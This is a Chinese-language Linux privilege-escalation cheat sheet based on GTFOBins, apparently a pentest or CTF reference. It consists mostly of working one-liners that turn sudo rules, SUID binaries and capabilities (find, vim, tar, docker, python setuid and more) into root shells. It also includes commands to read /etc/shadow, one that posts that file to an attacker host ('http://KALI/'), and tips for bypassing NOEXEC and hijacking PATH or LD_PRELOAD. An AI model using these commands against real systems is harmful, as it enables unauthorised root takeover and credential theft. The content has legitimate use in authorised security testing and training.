# GTFOBins 高频速查

完整：https://gtfobins.github.io/  
标签：`#sudo` `#suid` `#capabilities` `#file-read` `#file-write`

新版本可能已修。先 `sudo -l` / `find -perm -4000` / `getcap`，再对 **实际路径** 查，不要假设是 `/usr/bin/find`。

---

## sudo

`sudo -l` 看到下列命令 → 对应提权。目标是 `id` = uid=0。

```bash
sudo find / -exec /bin/bash -p \; -quit
sudo vim -c '!bash'
sudo nano          # Ctrl+R Ctrl+X  then reset; bash 1>&0 2>&0
sudo less /etc/passwd          # !bash
sudo more /etc/passwd          # !bash
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python3 -c 'import os;os.system("/bin/bash")'
sudo perl -e 'exec "/bin/bash"'
sudo ruby -e 'exec "/bin/bash"'
sudo lua -e 'os.execute("/bin/bash")'
sudo env /bin/bash
sudo bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/bash"
sudo gcc -wrapper /bin/bash,-s .
sudo busybox sh
sudo rsync /dev/null /tmp/x.sh -e 'sh -c "sh 0<&2 1>&2"'
sudo script -q /dev/null
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
sudo ftp                    # !bash
sudo socat stdin exec:/bin/bash
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
sudo mysql -e '! bash'
sudo systemctl edit --full <svc>    # 改 ExecStart=/bin/bash 然后 start
sudo journalctl                     # !bash   旧版
sudo man man                        # !bash
sudo ed                             # !bash
sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p
```

nmap：

```bash
# 旧 --interactive
sudo nmap --interactive    # !sh
# 新版本
echo 'os.execute("/bin/bash")' > /tmp/x.nse
sudo nmap --script=/tmp/x.nse
```

读文件（还不是 root shell，继续组合）：

```bash
sudo apache2 -f /etc/shadow
sudo wget --post-file=/etc/shadow http://KALI/
sudo curl file:///etc/shadow -o /tmp/shadow
```

---

## SUID

```bash
find / -perm -u=s -type f 2>/dev/null
```

```bash
find <path> -exec /bin/bash -p \; -quit
bash -p
python3 -c 'import os;os.execl("/bin/bash","bash","-p")'
env /bin/bash -p
pkexec --version    # 版本洞见 sudo-polkit.md，不是所有 pkexec 都能 PwnKit
```

`cp` SUID：可读 shadow 或把 bash 拷成 SUID。`chmod` SUID：给 `/bin/bash` 加 s 位。

自定义 SUID 二进制：`strings` / `ldd` 看调用了哪个裸命令 → PATH 劫持，见 `suid-caps-systemd.md`。

---

## capabilities

```bash
getcap -r / 2>/dev/null
```

```bash
# cap_setuid+ep
python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash"'
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
php -r 'posix_setuid(0); system("/bin/bash");'
node -e 'process.setuid(0); require("child_process").spawn("bash",{stdio:[0,1,2]})'

# cap_dac_read_search / cap_dac_override
tar czf /tmp/s.tar /etc/shadow
openssl passwd -6 'x'   # 读到哈希再离线打，或直接写 passwd 如果有 override
```

`cap_sys_admin` 往往能 mount/overlay，接近 root，见 `groups-containers.md` 和 `kernel-lpe.md`。不等于自动 root，但优先打。

---

## 提示

- 路径必须是 `sudo -l` 里的绝对路径。`sudo find` 实际是 `/usr/bin/find` 的规则才算。
- `NOEXEC` 会废掉很多 GTFOBins，改用 `cp`+chmod、写 sudoers、或 CVE。
- `SETENV` / `env_keep+=LD_PRELOAD` → `suid-caps-systemd.md` LD_PRELOAD。
- 版本洞（32463 等）不在本表，见 `sudo-polkit.md`。
